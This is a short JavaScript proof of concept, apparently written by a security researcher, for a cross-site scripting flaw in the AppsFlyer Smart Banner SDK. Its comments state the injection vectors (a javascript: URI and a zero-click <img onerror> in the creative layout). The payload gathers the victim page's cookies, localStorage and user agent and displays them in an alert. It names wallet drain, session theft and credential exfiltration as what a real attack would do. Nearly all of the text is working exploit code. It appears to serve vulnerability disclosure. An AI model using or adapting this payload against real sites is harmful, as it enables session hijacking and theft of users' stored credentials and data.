// AppsFlyer Smart Banner XSS PoC — s1n6h
// Fires on victim origin via javascript: URI in creative layout (one tap)
// Or via <img onerror> in creative layout (zero-click, verified)
// The SDK injects creative layout via innerHTML with no sanitization

(async () => {
  const data = {
    origin: window.location.origin,
    cookies: document.cookie || '(none)',
    localStorage: Object.keys(localStorage).length ? 
      JSON.stringify(Object.fromEntries(Object.entries(localStorage))).substring(0, 500) : '(empty)',
    userAgent: navigator.userAgent
  };
  alert(
    'XSS on: ' + data.origin + '\n\n' +
    'Cookies: ' + data.cookies + '\n\n' +
    'LocalStorage: ' + data.localStorage + '\n\n' +
    'In a real attack: wallet drain, session theft, credential exfiltration.'
  );
})();
